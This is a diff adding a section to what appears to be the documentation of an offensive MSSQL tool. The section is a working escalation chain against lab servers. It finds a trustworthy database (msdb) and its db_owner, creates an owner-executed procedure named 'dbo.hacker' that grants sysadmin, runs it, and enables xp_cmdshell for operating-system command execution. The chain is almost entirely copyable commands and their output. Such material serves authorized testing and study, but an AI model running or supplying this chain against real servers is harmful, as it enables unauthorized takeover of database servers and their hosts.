@@ -168,6 +168,39 @@ sql.exe --host db01 --as-user dev_int --operation query --raw "EXEC ('EXEC (''EX
 [+] Authenticated
 [+] Executing raw query
 nt service\mssql$sqlexpress
+
+
+
+##### Escalation from db_owner on msdb (or other trustworthy database)
+## Check trustworthy database
+./sql.exe --host dc02.lab.local --operation query --raw "SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;"
+[+] Authenticated against: master
+[+] Executing raw query
+master | False
+tempdb | False
+model | False
+msdb | True
+
+## Check DB owners
+./sql.exe --host dc02.lab.local --operation query --raw "SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)" --database msdb
+[+] Authenticated against: msdb
+[+] Executing raw query
+.....
+.....
+db_owner | LAB\svc_sql
+
+
+## Create a procedure to grant the current user sysadmin
+./sql.exe --host dc02.lab.local --operation query --raw "CREATE OR ALTER PROCEDURE dbo.hacker WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [LAB\svc_sql];" --database msdb
+
+## Exec procedure and get code execution
+./sql.exe --host dc02.lab.local --operation query --raw "exec dbo.hacker;" --database msdb
+
+./sql.exe --host dc02.mythical-eu.vl --operation exec --cmd whoami
+[+] Authenticated against: master
+[+] Attempting to enable xp_cmdshell on server 
+    Result:
+nt service\mssql$sqlexpress
 ```
 
 
